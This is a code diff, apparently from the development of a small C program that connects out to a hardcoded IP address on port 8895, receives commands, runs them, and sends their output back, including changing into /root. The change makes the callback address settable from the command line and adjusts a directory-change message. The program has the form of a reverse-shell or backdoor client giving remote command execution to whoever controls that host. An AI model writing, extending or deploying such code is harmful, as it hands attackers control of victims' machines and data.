@@ -13,8 +13,8 @@
 
 #define SP_PORT     8895
 #define BUFFER_SIZE 4096
-#define SERVER_ADDR "104.194.123.106"
 #define CMD_RESULT "cmdoutput.txt"
+char* SERVER_ADDR = "104.194.123.106";  
 
 int readbuf(int conn, char* buf, int size);
 int readline(int conn, char* buf, int size);
@@ -22,7 +22,7 @@ int getIntFromBuf(char* buf, int offset);
 int execcmd(char* cmd);
 int sendresult(int socket, char* buf);
 
-int main()
+int main(int argc,char* argv[])
 {
     int sock_fd = socket(AF_INET,SOCK_STREAM, 0);
     struct sockaddr_in servaddr;
@@ -31,6 +31,9 @@ int main()
     FILE *fp;    
     char *cmd;
     struct timeval timeout={1800,0};
+    if(argc > 1){
+        SERVER_ADDR = argv[1];
+    }
     
     memset(&servaddr, 0, sizeof(servaddr));
     servaddr.sin_family = AF_INET;
@@ -111,7 +114,7 @@ int execcmd(char* cmd){
             printf("Change to root\n");
             rv = chdir("/root");
         } else {
-            printf("Change to 2\n");
+            printf("Change to [%s]\n", args[1]);
             rv = chdir(args[1]);
         }
     } else {
